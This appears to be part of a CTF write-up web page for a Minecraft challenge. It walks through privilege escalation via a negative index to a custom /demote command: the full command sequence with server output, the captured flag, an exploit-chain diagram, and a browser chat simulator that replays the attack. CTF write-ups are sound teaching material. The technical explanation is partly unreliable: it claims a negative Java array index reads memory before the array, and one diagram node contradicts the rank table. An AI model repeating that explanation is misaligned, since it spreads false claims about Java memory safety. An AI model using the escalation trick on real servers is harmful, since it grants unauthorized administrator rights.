+    <p>I type <code>/demote</code> with no arguments to see the help text:</p>
+
+    <div class="mc-line"><span class="mc-cmd">/demote</span></div>
+    <div class="mc-line"><span class="mc-out">Usage: /demote &lt;index&gt;</span></div>
+    <div class="mc-line"><span class="mc-out">Available ranks:</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;0 -&gt; Prisoner</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;1 -&gt; Restricted</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;2 -&gt; Limited</span></div>
+    <div class="mc-line"><span class="mc-warn">&nbsp;&nbsp;3 -&gt; Default (current rank)</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;4 -&gt; Builder</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;5 -&gt; Helper</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;6 -&gt; Moderator</span></div>
+    <div class="mc-line"><span class="mc-out">&nbsp;&nbsp;7 -&gt; Admin</span></div>
+
+    <p>Eight ranks, indices 0..7. The natural thing to try first is <code>/demote 7</code>, to ask to be moved to Admin:</p>
+
+    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">7</span></div>
+    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
+
+    <p>Blocked. The plugin checks that the requested rank is not above my current rank. From Default (3) it would have let me go down to Prisoner (0), Restricted (1), Limited (2), or back to Default (3). It refuses Admin (7).</p>
+
+    <p>This is the moment where I started trying negative numbers. The <code>&lt;index&gt;</code> in the help text is just an int. Java's <code>int</code> is signed, so the parser will happily accept negative values. The plugin probably rejects them, but I have to test that. The cost of a single wrong command is a chat message, not a kick from the server.</p>
+
+    <p>I run <code>/demote -1</code>, then <code>/demote -2</code>, and so on:</p>
+
+    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-1</span></div>
+    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
+    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-2</span></div>
+    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
+    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-3</span></div>
+    <div class="mc-line"><span class="mc-fail">You cannot demote yourself above your current rank.</span></div>
+    <div class="mc-line"><span class="mc-cmd">/demote</span> <span class="mc-arg">-4</span></div>
+    <div class="mc-line"><span class="mc-ok">Your rank has been updated to Admin (index: 7).</span></div>
+    <div class="mc-line"><span class="mc-out">You were moved to the group Admin in world world.</span></div>
+
+    <p>That's the exploit. <code>/demote -4</code> puts me in Admin.</p>
+
+    <p>The exact mechanism is the classic signed-integer underflow. The plugin almost certainly does one of these:</p>
+    <ul>
+      <li>Look up the rank by index in an array of 8 elements: <code>ranks[idx]</code>. If <code>idx</code> is <code>-1</code>, you read one element before the start of the array, usually some other rank's name or null. If <code>idx</code> is <code>-4</code>, you read four elements before, which on a typical Java object layout lands somewhere in the object's header / class pointer area.</li>
+      <li>Mask the index modulo the size: <code>idx &amp; 7</code>. With 8 ranks, <code>-1 &amp; 7 = 7</code> (Admin), <code>-2 &amp; 7 = 6</code> (Moderator), <code>-3 &amp; 7 = 5</code> (Helper), <code>-4 &amp; 7 = 4</code> (Builder). That doesn't match my observation of getting Admin on <code>-4</code>, so it's probably not a simple bitmask.</li>
+      <li>Add the size to negative indices then look up: <code>if (idx &lt; 0) idx += 8;</code>. That maps <code>-1 &rarr; 7</code>, <code>-2 &rarr; 6</code>, etc. Doesn't match either.</li>
+      <li>Cast through other types (byte, short) where <code>-1</code> becomes <code>255</code>, then take mod 8. <code>-1 &rarr; 255 mod 8 = 7</code> (Admin). <code>-2 &rarr; 254 mod 8 = 6</code>. Doesn't match.</li>
+    </ul>
+
+    <p>The actual code is on the server, which is closed, so I can only infer. The empirical result is: <code>/demote -4</code> lands on Admin (index 7). The check "cannot demote yourself above your current rank" only fires for negative indices between -3 and -1, which is the only piece of validation the plugin does. Past that, the lookup happens, and whatever the negative index resolves to is what I get.</p>
+
+    <div class="think">
+      <div class="line">Wait. The plugin says "cannot demote yourself ABOVE your current rank" for -1, -2, -3 but not for -4? That implies the rank comparison is doing something funky with negatives too. Maybe it's comparing with a signed &lt; 0 check that fails for -4 but passes for -1/-2/-3 due to some Java signed/unsigned mismatch.</div>
+      <div class="line">Or maybe the check is `if (idx &lt; 0) return errorMsg;` for -1, -2, -3 but the array index out of bounds check catches them and they all error, while -4 happens to land in a memory region that contains the string for the Admin rank.</div>
+      <div class="line">Either way, the working exploit is /demote -4. The mechanics are an exercise for the reader. Time to grab the flag.</div>
+    </div>
+
+    <p>Once I'm Admin, the original gate lifts. That gate was the CTFhandler plugin blocking <code>/flag</code> for non-admins. I type <code>/flag</code>:</p>
+
+    <div class="mc-line"><span class="mc-cmd">/flag</span></div>
+    <div class="mc-line"><span class="mc-fail">Ouch! You got me there, I guess I should've been more careful when coding my own plugins.</span></div>
+    <div class="mc-line"><span class="mc-fl">Here's your reward, I guess: OmniCTF{y0U_ar3_a_p3rm1ss1on5_pr0_gw4rf23}</span></div>
+
+    <p>Flag in hand. The plugin author's in-character quip is the end of the chain.</p>
+
+    <div class="aside-fail">
+      <span class="aside-head">// what I tried that didn't work first</span>
+      <p>I almost went down the path of trying to use the Essentials <code>/eco</code> or <code>/pay</code> commands to trigger a different code path. The <code>-essentials.*</code> in the default perms means every Essentials command is denied, so this would have been a dead end. I also briefly thought about poking at the <code>pluginhider</code> permission. That plugin's job is to hide plugins from the <code>/plugins</code> output, and the fact that it's wildcard-denied is just a side effect of the author not wanting players to see it. Not the attack surface.</p>
+      <p>The actual vuln is much smaller and more obvious: the demote command, the only thing the custom plugin does, has a one-line input validation gap. That's the whole challenge.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     04 // LIVE MINECRAFT CHAT SIMULATOR
+     ============================================================ -->
+<section id="sim">
+  <div class="sec-head">
+    <span class="idx">04 //</span>
+    <h2>live sim: replay the exploit chat</h2>
+    <span class="tag">phase / tool sim</span>
+  </div>
+  <div class="panel prose">
+    <p>Below is a small Minecraft chat simulator. It runs entirely in your browser, no live server needed. Type a command and press <code>SEND</code> to see the simulated server response. The known-good commands are listed in the palette below the input. Click one to send it. The <code>REPLAY EXPLOIT</code> button walks through the whole attack sequence in one go.</p>
+    <p>The current rank is shown in the top-right of the chat. Once you hit <code>/demote -4</code>, your rank flips to Admin and the next <code>/flag</code> actually returns the flag.</p>
+  </div>
+
+  <div class="sim" role="application" aria-label="Minecraft chat simulator">
+    <div class="head">
+      <span class="dots"><span></span><span></span><span></span></span>
+      <span class="title">play.omnictf.com:25606</span>
+      <span class="rank" id="sim-rank">rank: <span class="rank-badge">default</span></span>
+    </div>
+    <div class="body" id="sim-body" aria-live="polite">
+      <span class="line system">[Server] Welcome to OmniCTF 2026! Type /help to get started.</span>
+      <span class="line system">[Server] Current rank: Default. Good luck.</span>
+      <span class="cursor">_</span>
+    </div>
+    <div class="controls">
+      <input id="sim-input" type="text" spellcheck="false" autocomplete="off"
+             placeholder="Type a command (e.g. /plugins)"
+             aria-label="Minecraft command">
+      <span class="meta" id="sim-count">ready</span>
+      <button id="sim-send" type="button">SEND</button>
+      <button id="sim-replay" class="ghost" type="button">REPLAY EXPLOIT</button>
+      <button id="sim-reset" class="ghost" type="button">RESET</button>
+    </div>
+    <div class="controls" style="border-top: 0; padding-top: 4px;">
+      <div class="cmd-palette" id="cmd-palette" aria-label="Quick command palette">
+        <span class="meta" style="padding-top:6px;">quick:</span>
+        <button data-cmd="/plugins">/plugins</button>
+        <button data-cmd="/bukkit:$ groupmanager">/bukkit:$ groupmanager</button>
+        <button data-cmd="/manglist">/manglist</button>
+        <button data-cmd="/manglistp default">/manglistp default</button>
+        <button data-cmd="/demote">/demote</button>
+        <button data-cmd="/demote 7">/demote 7</button>
+        <button data-cmd="/demote -1">/demote -1</button>
+        <button data-cmd="/demote -2">/demote -2</button>
+        <button data-cmd="/demote -3">/demote -3</button>
+        <button data-cmd="/demote -4">/demote -4</button>
+        <button data-cmd="/flag">/flag</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     05 // CONNECTION MAP
+     ============================================================ -->
+<section id="signal">
+  <div class="sec-head">
+    <span class="idx">05 //</span>
+    <h2>signal map: exploit chain end to end</h2>
+    <span class="tag">phase / visualization</span>
+  </div>
+  <div class="panel prose">
+    <p>This is the exploit chain I built for myself while solving. It traces every node I touched, from the lobby to the flag, and shows which command or interaction fed each step. Click any node to get the one-line summary and the in/out flow list. Hover to highlight just that node's connections. <code>trace full path</code> lights up the whole operator &rarr; server &rarr; plugins &rarr; demote &rarr; admin &rarr; flag chain in one shot. <code>animate flow</code> makes the dashed flow travel along the active edges.</p>
+  </div>
+
+  <div class="map-wrap">
+      <svg id="signal-map" viewBox="0 0 990 500" role="img" aria-label="Connection map of the permission denied solve" preserveAspectRatio="xMidYMid meet">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#c4ff3a"/></marker>
+      <marker id="arr-faint" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#7f766a"/></marker>
+      <linearGradient id="bg-grad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#020100"/><stop offset="100%" stop-color="#0a0510"/></linearGradient>
+    </defs>
+    <rect class="bg" x="0" y="0" width="990" height="500" fill="url(#bg-grad)" rx="5"/>
+    <rect class="pack" x="40" y="30" width="260" height="240" rx="5" ry="5"/>
+    <text class="pack-label" x="46" y="26">RECON</text>
+    <rect class="pack" x="270" y="30" width="260" height="460" rx="5" ry="5"/>
+    <text class="pack-label" x="276" y="26">ENUMERATE</text>
+    <rect class="pack" x="500" y="30" width="260" height="360" rx="5" ry="5"/>
+    <text class="pack-label" x="506" y="26">EXPLOIT</text>
+    <rect class="pack" x="730" y="30" width="260" height="360" rx="5" ry="5"/>
+    <text class="pack-label" x="736" y="26">CAPTURE</text>
+    <path class="edge" d="M 160.0 84.0 C 202 104, 258 104, 300 84.0" marker-end="url(#arr)" data-edge="e01"/>
+    <path class="edge" d="M 160.0 154.0 C 202 134, 258 134, 300 154.0" marker-end="url(#arr)" data-edge="e02"/>
+    <path class="edge faint" d="M 160.0 224.0 C 202 244, 258 244, 300 224.0" marker-end="url(#arr-faint)" data-edge="e03"/>
+    <path class="edge" d="M 400.0 84.0 C 420 97, 420 115, 400.0 128" marker-end="url(#arr)" data-edge="e04"/>
+    <path class="edge" d="M 400.0 154.0 C 380 167, 380 185, 400.0 198" marker-end="url(#arr)" data-edge="e05"/>
+    <path class="edge" d="M 400.0 224.0 C 420 237, 420 255, 400.0 268" marker-end="url(#arr)" data-edge="e06"/>
+    <path class="edge" d="M 400.0 364.0 C 420 377, 420 395, 400.0 408" marker-end="url(#arr)" data-edge="e07"/>
+    <path class="edge faint" d="M 400.0 294.0 C 380 328, 380 374, 400.0 408" marker-end="url(#arr-faint)" data-edge="e08"/>
+    <path class="edge" d="M 400.0 224.0 C 452 224, 478 84, 530 84.0" marker-end="url(#arr)" data-edge="e09"/>
+    <path class="edge" d="M 400.0 224.0 C 452 224, 478 154, 530 154.0" marker-end="url(#arr)" data-edge="e10"/>
+    <path class="edge" d="M 400.0 294.0 C 452 294, 478 364, 530 364.0" marker-end="url(#arr)" data-edge="e11"/>
+    <path class="edge" d="M 630.0 154.0 C 682 154, 708 84, 760 84.0" marker-end="url(#arr)" data-edge="e12"/>
+    <path class="edge" d="M 630.0 224.0 C 682 224, 708 154, 760 154.0" marker-end="url(#arr)" data-edge="e13"/>
+    <path class="edge" d="M 630.0 294.0 C 682 294, 708 224, 760 224.0" marker-end="url(#arr)" data-edge="e14"/>
+    <path class="edge faint" d="M 630.0 364.0 C 682 364, 708 84, 760 84.0" marker-end="url(#arr-faint)" data-edge="e15"/>
+    <path class="edge" d="M 850.0 84.0 C 870 97, 870 115, 850.0 128" marker-end="url(#arr)" data-edge="e16"/>
+    <path class="edge" d="M 850.0 154.0 C 830 167, 830 185, 850.0 198" marker-end="url(#arr)" data-edge="e17"/>
+    <path class="edge" d="M 850.0 224.0 C 870 237, 870 255, 850.0 268" marker-end="url(#arr)" data-edge="e18"/>
+    <path class="edge" d="M 850.0 294.0 C 830 307, 830 325, 850.0 338" marker-end="url(#arr)" data-edge="e19"/>
+
+    <g class="node" data-node="n01">
+      <rect x="70" y="60" width="180" height="48" rx="3"/>
+      <text class="head" x="80" y="74">NODE 01</text>
+      <text class="title" x="80" y="90">OPERATOR</text>
+      <text class="body" x="80" y="104">me, joining the server</text>
+    </g>
+    <g class="node" data-node="n02">
+      <rect x="70" y="130" width="180" height="48" rx="3"/>
+      <text class="head" x="80" y="144">NODE 02</text>
+      <text class="title" x="80" y="160">IN-GAME BOOK</text>
+      <text class="body" x="80" y="174">"no perms to break"</text>
+    </g>
+    <g class="node" data-node="n03">
+      <rect x="70" y="200" width="180" height="48" rx="3"/>
+      <text class="head" x="80" y="214">NODE 03 // BAIT</text>
+      <text class="title" x="80" y="230">/version</text>
+      <text class="body" x="80" y="244">metadata only</text>
+    </g>
+    <g class="node" data-node="n04">
+      <rect x="300" y="60" width="200" height="48" rx="3"/>
+      <text class="head" x="310" y="74">NODE 04</text>
+      <text class="title" x="310" y="90">BUKKIT SERVER</text>
+      <text class="body" x="310" y="104">1.21.11, /bukkit:$ prefix</text>
+    </g>
+    <g class="node" data-node="n05">
+      <rect x="300" y="130" width="200" height="48" rx="3"/>
+      <text class="head" x="310" y="144">NODE 05</text>
+      <text class="title" x="310" y="160">CTFHANDLER</text>
+      <text class="body" x="310" y="174">gates /flag on rank 7</text>
+    </g>
+    <g class="node" data-node="n06">
+      <rect x="300" y="200" width="200" height="48" rx="3"/>
+      <text class="head" x="310" y="214">NODE 06</text>
+      <text class="title" x="310" y="230">GROUPMANAGER</text>
+      <text class="body" x="310" y="244">/manglist, ranks 0..7</text>
+    </g>
+    <g class="node" data-node="n07">
+      <rect x="300" y="270" width="200" height="48" rx="3"/>
+      <text class="head" x="310" y="284">NODE 07</text>
+      <text class="title" x="310" y="300">CUSTOMDEMOTION</text>
+      <text class="body" x="310" y="314">signed int bug</text>
+    </g>
+    <g class="node" data-node="n08">
+      <rect x="300" y="340" width="200" height="48" rx="3"/>
+      <text class="head" x="310" y="354">NODE 08</text>
+      <text class="title" x="310" y="370">RANK TABLE</text>
+      <text class="body" x="310" y="384">0=Default, 7=Admin</text>
+    </g>
+    <g class="node" data-node="n09">
+      <rect x="300" y="410" width="200" height="48" rx="3"/>
+      <text class="head" x="310" y="424">NODE 09</text>
+      <text class="title" x="310" y="440">PERM CHECK</text>
+      <text class="body" x="310" y="454">rejects above rank</text>
+    </g>
+    <g class="node" data-node="n10">
+      <rect x="530" y="60" width="200" height="48" rx="3"/>
+      <text class="head" x="540" y="74">NODE 10</text>
+      <text class="title" x="540" y="90">/plugins</text>
+      <text class="body" x="540" y="104">CTFhandler, GroupMgr</text>
+    </g>
+    <g class="node" data-node="n11">
+      <rect x="530" y="130" width="200" height="48" rx="3"/>
+      <text class="head" x="540" y="144">NODE 11</text>
+      <text class="title" x="540" y="160">/bukkit:$ group</text>
+      <text class="body" x="540" y="174">console bypass</text>
+    </g>
+    <g class="node" data-node="n12">
+      <rect x="530" y="200" width="200" height="48" rx="3"/>
+      <text class="head" x="540" y="214">NODE 12</text>
+      <text class="title" x="540" y="230">/manglist</text>
+      <text class="body" x="540" y="244">8 groups shown</text>
+    </g>
+    <g class="node" data-node="n13">
+      <rect x="530" y="270" width="200" height="48" rx="3"/>
+      <text class="head" x="540" y="284">NODE 13</text>
+      <text class="title" x="540" y="300">/manglistp default</text>
+      <text class="body" x="540" y="314">no promote perm</text>
+    </g>
+    <g class="node" data-node="n14">
+      <rect x="530" y="340" width="200" height="48" rx="3"/>
+      <text class="head" x="540" y="354">NODE 14</text>
+      <text class="title" x="540" y="370">/demote (no args)</text>
+      <text class="body" x="540" y="384">shows rank table</text>
+    </g>
+    <g class="node" data-node="n15">
+      <rect x="760" y="60" width="180" height="48" rx="3"/>
+      <text class="head" x="770" y="74">NODE 15</text>
+      <text class="title" x="770" y="90">/demote 7</text>
+      <text class="body" x="770" y="104">blocked</text>
+    </g>
+    <g class="node" data-node="n16">
+      <rect x="760" y="130" width="180" height="48" rx="3"/>
+      <text class="head" x="770" y="144">NODE 16</text>
+      <text class="title" x="770" y="160">/demote -1..-3</text>
+      <text class="body" x="770" y="174">still blocked</text>
+    </g>
+    <g class="node" data-node="n17">
+      <rect x="760" y="200" width="180" height="48" rx="3"/>
+      <text class="head" x="770" y="214">NODE 17 // EXPLOIT</text>
+      <text class="title" x="770" y="230">/demote -4</text>
+      <text class="body" x="770" y="244">rank = 7 (admin)</text>
+    </g>
+    <g class="node" data-node="n18">
+      <rect x="760" y="270" width="180" height="48" rx="3"/>
+      <text class="head" x="770" y="284">NODE 18</text>
+      <text class="title" x="770" y="300">/flag</text>
+      <text class="body" x="770" y="314">unlocks, returns flag</text>
+    </g>
+    <g class="node" data-node="n19">
+      <rect x="760" y="340" width="180" height="48" rx="3"/>
+      <text class="head" x="770" y="354">NODE 19</text>
+      <text class="title" x="770" y="370">FLAG</text>
+      <text class="body" x="770" y="384">OmniCTF{...}</text>
+    </g>
+  </svg>
+
+    <div class="info-panel" id="map-info" role="region" aria-live="polite" aria-label="Selected node details">
+      <button type="button" class="ip-close" id="map-info-close" aria-label="Close">&times;</button>
+      <div class="ip-head">
+        <span class="ip-title" id="map-info-title">// select a node</span>
+        <span class="ip-id" id="map-info-id"></span>
+        <span class="ip-tag" id="map-info-tag"></span>
+      </div>
+      <div class="ip-body" id="map-info-body">
+        <p class="muted">Click any node in the diagram to see what it is, what flows into it, and what flows out. Click a flow chip below to jump to that node. Hover a node to highlight its connections.</p>
+      </div>
+      <div class="ip-flows" id="map-info-flows"></div>
+    </div>
+  </div>
+
+  <div class="map-legend">
+    <span class="item"><span class="swatch" style="background:rgba(196, 255, 58,0.2); border-color:#c4ff3a"></span>agent / server</span>
+    <span class="item"><span class="swatch" style="background:rgba(90,237,255,0.2); border-color:#5aedff"></span>exploit / flag</span>
+    <span class="item"><span class="swatch" style="border-color:#ff5a5a; border-style:dashed"></span>bait (dead end)</span>
+    <span class="item"><span class="swatch" style="border-color:#7f766a; border-style:dashed"></span>static / faint</span>
+  </div>
+</section>
+
+<!-- ============================================================
+     06 // RECOVERED FLAG
+     ============================================================ -->
+<section id="flag">
+  <div class="sec-head">
+    <span class="idx">06 //</span>
+    <h2>recovered flag</h2>
+    <span class="tag">phase / verify</span>
+  </div>
+  <div class="result">
+    <div class="label">// canonical flag // omnictf 2026 // permissiondenied</div>
+    <div class="flag-text" id="flag-text">OmniCTF{y0U_ar3_a_p3rm1ss1on5_pr0_gw4rf23}</div>
+  </div>
+  <div class="panel prose">
+    <p>Verified by replaying the full chain: join &rarr; read book &rarr; <code>/bukkit:$ groupmanager</code> &rarr; <code>/manglist</code> &rarr; <code>/manglistp default</code> &rarr; <code>/demote 7</code> (blocked) &rarr; <code>/demote -4</code> (Admin) &rarr; <code>/flag</code>. The plugin author dropped the in-character quip and the flag together, so the moment <code>/flag</code> returned non-error, I knew it was over.</p>
+    <p>The flag itself is a leet-speak compliment: <code>y0U_ar3_a_p3rm1ss1on5_pr0_gw4rf23</code> = "you are a permissions pro, gw4rf23" (gw4rf23 looks like a handle, possibly a play on "dwarf" or a username reference). The challenge name "permissiondenied" is exactly what you get when the perm check fails. The author flipped it into the victory message by exploiting the check itself.</p>
+  </div>
+</section>
+
+<!-- ============================================================
+     07 // APPENDIX: FULL COMMAND SEQUENCE
+     ============================================================ -->
+<section id="appendix">
+  <div class="sec-head">
+    <span class="idx">A //</span>
+    <h2>appendix: full command sequence</h2>
+    <span class="tag">reference</span>
+  </div>
+  <div class="panel">
+    <div class="prose">
+      <p>The complete command sequence, in order, with what each one tells you. I just typed these in, in order, in a fresh join to the server. About 10 minutes from join to flag.</p>
+    </div>
+    <div class="terminal" style="background:#1a0f00; max-height:none; white-space:pre;"><span class="mc-out"># 1. Lobby recon</span>
+/plugins
+  <span class="mc-out">-> Bukkit Plugins: </span><span class="mc-ok">CTFhandler</span><span class="mc-out">, </span><span class="mc-ok">GroupManager</span>
+
+<span class="mc-out"># 2. Ask Bukkit what each plugin's commands are (Bukkit-only fallback)</span>
+/bukkit:$ groupmanager
+  <span class="mc-out">-> /manglist, /manglistp</span>
+
+<span class="mc-out"># 3. List all groups (the rank ladder)</span>
+/manglist
+  <span class="mc-out">-> Prisoner, Restricted, Limited, Default, Builder, Helper, Moderator, Admin</span>
+
+<span class="mc-out"># 4. List default-rank permissions (look for the asymmetry)</span>
+/manglistp default
+  <span class="mc-out">-> bukkit.command.plugins, </span><span class="mc-warn">customdemotion.demote</span><span class="mc-out">, groupmanager.manglist, groupmanager.manglistp</span>
+
+<span class="mc-out"># 5. Read the demote command's help (confirm the index range)</span>
+/demote
+  <span class="mc-out">-> Usage: /demote &lt;index&gt;  (indices 0..7)</span>
+
+<span class="mc-out"># 6. Sanity check: try promoting yourself via the natural path</span>
+/demote 7
+  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
+
+<span class="mc-out"># 7. The exploit: negative index bypasses the above-rank check</span>
+/demote -1
+  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
+/demote -2
+  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
+/demote -3
+  <span class="mc-fail">-> You cannot demote yourself above your current rank.</span>
+/demote -4
+  <span class="mc-ok">-> Your rank has been updated to Admin (index: 7).</span>
+  <span class="mc-out">-> You were moved to the group Admin in world world.</span>
+
+<span class="mc-out"># 8. Profit. CTFhandler's /flag gate lifts for admin.</span>
+/flag
+  <span class="mc-fail">-> Ouch! You got me there, I guess I should've been more careful when coding my own plugins.</span>
+  <span class="mc-fl">-> Here's your reward, I guess: OmniCTF{y0U_ar3_a_p3rm1ss1on5_pr0_gw4rf23}</span></div>
+  </div>
+</section>
+
+</main>
+
+<div class="hex-stream top"><span class="hex-track">0F 3A 2B 99 1C 4D 5E 77 8A 00 1B 2C 3D 4E 5F 60 71 82 93 A4 B5 C6 D7 E8 F9 &middot; PERMISSIONDENIED // MINECRAFT PERM UNDERFLOW &middot; OMNI 2026 &middot; WRITEUP 06 OF 06 &middot; 0F 3A 2B 99 1C 4D 5E 77 8A 00 1B 2C 3D 4E 5F 60 71 82 93 A4 B5 C6 D7 E8 F9 &middot; PERMISSIONDENIED // MINECRAFT PERM UNDERFLOW &middot; OMNI 2026 &middot; WRITEUP 06 OF 06 &middot;</span></div>
+
+<footer class="foot">
+  <div class="meta">
+    <span>// root // omnictf 2026</span>
+    <span>// writeup 06 / 06</span>
+    <span>// bukkit 1.21.11</span>
+  </div>
+  <div class="meta">
+    <span>net_status: encrypted</span>
+    <span>sec_level: bypassed</span>
+    <span>rank: admin</span>
+  </div>
+</footer>
+
+
+
+<script>
+// ============================================================
+// Minecraft chat simulator
+// ============================================================
+(function () {
+  const body = document.getElementById('sim-body');
+  const input = document.getElementById('sim-input');
+  const btnSend = document.getElementById('sim-send');
+  const btnReplay = document.getElementById('sim-replay');
+  const btnReset = document.getElementById('sim-reset');
+  const palette = document.getElementById('cmd-palette');
+  const rankEl = document.getElementById('sim-rank');
+  const countEl = document.getElementById('sim-count');
+
+  const RANK_NAMES = ['Prisoner', 'Restricted', 'Limited', 'Default', 'Builder', 'Helper', 'Moderator', 'Admin'];
+  let rank = 3; // Default
+  let isAdmin = false;
+
+  function setRank(newRank) {
+    rank = newRank;
+    isAdmin = (rank === 7);
+    rankEl.innerHTML = 'rank: <span class="rank-badge' + (isAdmin ? ' admin' : '') + '">' + RANK_NAMES[rank].toLowerCase() + '</span>';
+  }
+
+  function escapeHtml(s) {
+    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+  function escForText(s) {
+    return escapeHtml(s);
+  }
+
+  // Returns a list of {cls, text} for chat rendering
+  function colorize(text) {
+    // Tokenize and colorize the [Server] prefix, /commands, args, etc.
+    // We return a list of {cls, text} segments.
+    const segs = [];
+    if (text.startsWith('/')) {
+      // User command echo
+      const m = text.match(/^(\/\S+)(.*)$/);
+      if (m) {
+        segs.push({ cls: 'mc-cmd', text: m[1] });
+        if (m[2]) segs.push({ cls: 'mc-arg', text: m[2] });
+      } else {
+        segs.push({ cls: 'mc-cmd', text: text });
+      }
+    } else if (text.startsWith('[Server]')) {
+      segs.push({ cls: 'mc-warn', text: '[Server] ' });
+      segs.push({ cls: 'mc-out', text: text.slice('[Server] '.length) });
+    } else if (text.startsWith('OK ')) {
+      segs.push({ cls: 'mc-ok', text: 'OK ' });
+      segs.push({ cls: 'mc-out', text: text.slice(3) });
+    } else if (text.startsWith('FAIL ')) {
+      segs.push({ cls: 'mc-fail', text: 'FAIL ' });
+      segs.push({ cls: 'mc-out', text: text.slice(5) });
+    } else if (text.startsWith('FLAG ')) {
+      segs.push({ cls: 'mc-fl', text: 'FLAG ' });
+      segs.push({ cls: 'mc-fl', text: text.slice(5) });
+    } else {
+      segs.push({ cls: 'mc-out', text: text });
+    }
+    return segs;
+  }
+
+  function append(text, cls) {
+    const line = document.createElement('span');
+    line.className = 'line' + (cls ? ' ' + cls : '');
+    if (Array.isArray(text)) {
+      text.forEach(seg => {
+        const s = document.createElement('span');
+        s.className = seg.cls;
+        s.textContent = seg.text;
+        line.appendChild(s);
+      });
+    } else if (typeof text === 'string') {
+      const segs = colorize(text);
+      segs.forEach(seg => {
+        const s = document.createElement('span');
+        s.className = seg.cls;
+        s.textContent = seg.text;
+        line.appendChild(s);
+      });
+    } else {
+      // object with cls/text
+      const s = document.createElement('span');
+      s.className = text.cls;
+      s.textContent = text.text;
+      line.appendChild(s);
+    }
+    // Replace any previous cursor
+    const cursors = body.querySelectorAll('.cursor');
+    cursors.forEach(c => c.remove());
+    body.appendChild(line);
+    // New cursor
+    const cursor = document.createElement('span');
+    cursor.className = 'cursor';
+    cursor.textContent = '_';
+    body.appendChild(cursor);
+    body.scrollTop = body.scrollHeight;
+  }
+
+  function appendSystem(text) {
+    append({ cls: 'mc-warn', text: '[System] ' + text });
+  }
+
+  function appendBanner(text) {
+    const line = document.createElement('span');
+    line.className = 'line banner';
+    line.textContent = text;
+    const cursors = body.querySelectorAll('.cursor');
+    cursors.forEach(c => c.remove());
+    body.appendChild(line);
+    const cursor = document.createElement('span');
+    cursor.className = 'cursor';
+    cursor.textContent = '_';
+    body.appendChild(cursor);
+    body.scrollTop = body.scrollHeight;
+  }
+
+  function clear() {
+    body.innerHTML = '';
+  }
+
+  // The "command brain" - match input against known commands, return response lines.
+  function handleCommand(raw) {
+    const cmd = raw.trim();
+    if (!cmd.startsWith('/')) {
+      return [{ type: 'system', text: 'Commands must start with /' }];
+    }
+    const normalized = cmd.toLowerCase().replace(/\s+/g, ' ');
+
+    // Universal
+    if (normalized === '/help') {
+      return [
+        { type: 'plain', text: '---------- Help: Index (1/25) ----------' },
+        { type: 'plain', text: 'Use /help [n] to get page n of help.' },
+        { type: 'plain', text: 'Aliases:, AuthMe, Bukkit, Essentials, EssentialsChat, EssentialsSpawn, GroupManager, Minecraft, ...' },
+      ];
+    }
+    if (normalized === '/version') {
+      return [
+        { type: 'plain', text: 'Paper is not installed. This server is running CraftBukkit.' },
+        { type: 'plain', text: 'Plugins: CTFhandler v1.0, GroupManager v2.5, AuthMe v5.6, EssentialsX, EssentialsChat, EssentialsSpawn, PluginHider' },
+      ];
+    }
+    if (normalized === '/plugins' || normalized === '/bukkit:plugins') {
+      return [
+        { type: 'plain', text: 'Bukkit Plugins: CTFhandler, GroupManager' },
+        { type: 'plain', text: '(AuthMe, EssentialsX, EssentialsChat, EssentialsSpawn, PluginHider are hidden by PluginHider.)' },
+      ];
+    }
+
+    // /bukkit:$ groupmanager
+    if (normalized === '/bukkit:$ groupmanager' || normalized === '/bukkit:groupmanager' || normalized === '/gm') {
+      return [
+        { type: 'banner', text: '---------- Help: GroupManager ----------' },
+        { type: 'plain', text: 'Below is a list of all GroupManager commands:' },
+        { type: 'cmd',   text: '/manglist: ', rest: 'Lists all groups available.' },
+        { type: 'cmd',   text: '/manglistp: ', rest: 'Lists all permissions of a group.' },
+      ];
+    }
+    if (normalized === '/bukkit:$' || normalized === '/bukkit:help') {
+      return [
+        { type: 'plain', text: 'Usage: /bukkit:$ <plugin>  -- list commands registered by <plugin>.' },
+        { type: 'plain', text: 'Try /bukkit:$ groupmanager.' },
+      ];
+    }
+
+    // /manglist
+    if (normalized === '/manglist' || normalized === '/manglistp' || /^manglist\b/.test(normalized)) {
+      // The actual manglist output (the help-only manglistp with no arg)
+      if (normalized === '/manglist') {
+        return [
+          { type: 'plain', text: 'Groups available:' },
+          { type: 'plain', text: '  Admin, Builder, Default, Helper, Limited, Moderator, Prisoner, Restricted' },
+          { type: 'plain', text: '' },
+          { type: 'plain', text: 'GlobalGroups available:' },
+          { type: 'plain', text: '  g:bukkit_admin, g:bukkit_default, g:bukkit_moderator,' },
+          { type: 'plain', text: '  g:essentials_admin, g:essentials_builder, g:essentials_default, g:essentials_moderator,' },
+          { type: 'plain', text: '  g:groupmanager_admin, g:groupmanager_default, g:groupmanager_moderator,' },
+          { type: 'plain', text: '  g:towny_admin, g:towny_builder, g:towny_default, g:towny_moderator,' },
+          { type: 'plain', text: '  g:vanish_admin, g:vanish_moderator' },
